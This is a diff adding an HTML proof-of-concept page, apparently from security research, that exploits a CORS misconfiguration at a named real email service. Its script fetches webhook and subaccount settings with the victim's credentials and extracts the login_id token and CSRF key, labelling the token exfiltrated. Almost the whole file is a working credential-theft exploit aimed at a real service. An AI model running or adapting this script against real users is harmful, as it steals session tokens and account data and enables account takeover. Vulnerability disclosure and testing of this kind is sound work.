@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>WCP-006 CORS PoC</title>
+  <style>
+    body { background:#111; color:#ccc; font-family:monospace; padding:20px; }
+    pre  { background:#000; border:1px solid #333; padding:12px; white-space:pre-wrap; word-break:break-all; }
+    .ok  { color:#4f4 }
+    .err { color:#f44 }
+    h3   { color:#fa0; margin:20px 0 6px }
+  </style>
+</head>
+<body>
+<h2>WCP-006 — CORS credential theft (smtp2go × insights.hotjar.com)</h2>
+<pre id="log">Running...</pre>
+
+<script>
+const T = 'https://app-us.smtp2go.com';
+let csrf = null;
+
+function log(msg, cls) {
+  const el = document.getElementById('log');
+  const span = document.createElement('span');
+  if (cls) span.className = cls;
+  span.textContent = msg + '\n';
+  el.appendChild(span);
+}
+
+async function get(url, opts) {
+  const r = await fetch(T + url, { credentials:'include', mode:'cors', ...opts });
+  const body = await r.text();
+  const acao = r.headers.get('access-control-allow-origin') || '(none)';
+  const acac = r.headers.get('access-control-allow-credentials') || '(none)';
+  log(`→ ${r.status}  ACAO: ${acao}  ACAC: ${acac}`);
+  return { r, body };
+}
+
+async function run() {
+  // [1] Webhooks — no CSRF, ACAC confirmed, leaks login_id token in response body
+  log('\n[1] /api/settings/webhooks/');
+  try {
+    const { body } = await get('/api/settings/webhooks/');
+    const parsed = JSON.parse(body);
+
+    const loginId = parsed.login_id;
+    if (loginId) {
+      log(`\n*** login_id TOKEN EXFILTRATED ***\n${loginId}\n`, 'ok');
+    }
+
+    const csrf = parsed.results?.csrf_key || parsed.csrf_key || null;
+    if (csrf) log(`CSRF found: ${csrf}`, 'ok');
+
+    log(body.slice(0, 3000), 'ok');
+  } catch(e) { log('FAILED: ' + e.message, 'err'); return; }
+
+  // [2] Subaccounts — no CSRF, account metadata + plan info
+  log('\n[2] /api/settings/subaccounts/');
+  try {
+    const { body } = await get('/api/settings/subaccounts/');
+    log(body.slice(0, 3000), 'ok');
+  } catch(e) { log('FAILED: ' + e.message, 'err'); }
+
+  log('\nDone.', 'ok');
+}
+
+run();
+</script>
+</body>
+</html>
